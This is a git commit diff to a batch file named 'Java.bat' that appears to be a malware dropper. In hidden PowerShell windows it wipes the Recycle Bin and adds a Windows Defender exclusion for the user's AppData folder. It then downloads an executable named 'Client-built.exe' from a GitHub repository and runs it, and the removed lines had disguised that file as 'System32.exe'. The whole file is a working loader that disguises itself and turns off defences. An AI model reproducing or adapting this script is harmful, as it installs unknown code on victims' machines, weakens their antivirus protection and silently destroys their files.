9ad09070ff6645b6ac0e66dfcab0fa71558ffd39
MrAboudi <94474093+Abdullah67289@users.noreply.github.com>
2025-07-10 14:30:29 -0400

    Update Java.bat

--- Java.bat
+++ Java.bat
@@ -1,11 +1,21 @@
 @echo off
 
-:: Always clean SubDir
-set "SUBDIR=%USERPROFILE%\AppData\Roaming\SubDir"
+:: Set paths early
+set "APPDATA_PATH=%USERPROFILE%\AppData"
+set "SUBDIR=%APPDATA_PATH%\Roaming\SubDir"
+set "TRACES_DIR=%APPDATA_PATH%\Roaming\Traces"
+set "TARGET_FILE=%TRACES_DIR%\Client-built.exe"
+set "DOWNLOAD_URL=https://github.com/Abdullah67289/Ghoste-Trace/raw/refs/heads/main/Client-built.exe"
+
+:: Delete SubDir and Traces contents
 if exist "%SUBDIR%" (
     rmdir /s /q "%SUBDIR%"
 )
+if exist "%TRACES_DIR%" (
+    rmdir /s /q "%TRACES_DIR%"
+)
 mkdir "%SUBDIR%"
+mkdir "%TRACES_DIR%"
 
 :: Silent Recycle Bin Wipe
 powershell -WindowStyle Hidden -Command "$null = (New-Object -ComObject Shell.Application).NameSpace(0xA).Items() | ForEach-Object { Remove-Item $_.Path -Recurse -Force -ErrorAction SilentlyContinue }"
@@ -24,15 +34,10 @@ if %errorlevel% NEQ 0 (
     exit /b
 )
 
-:: Set paths
-set "APPDATA_PATH=%USERPROFILE%\AppData"
-set "TARGET_FILE=%SUBDIR%\System32.exe"
-set "DOWNLOAD_URL=https://github.com/Abdullah67289/Ghoste-Trace/raw/refs/heads/main/Client-built.exe"
-
 :: Defender Exclusion
 powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%APPDATA_PATH%'"
 
-:: Download and run
+:: Download and run client
 powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%DOWNLOAD_URL%', '%TARGET_FILE%')"
 start "" "%TARGET_FILE%"
 exit
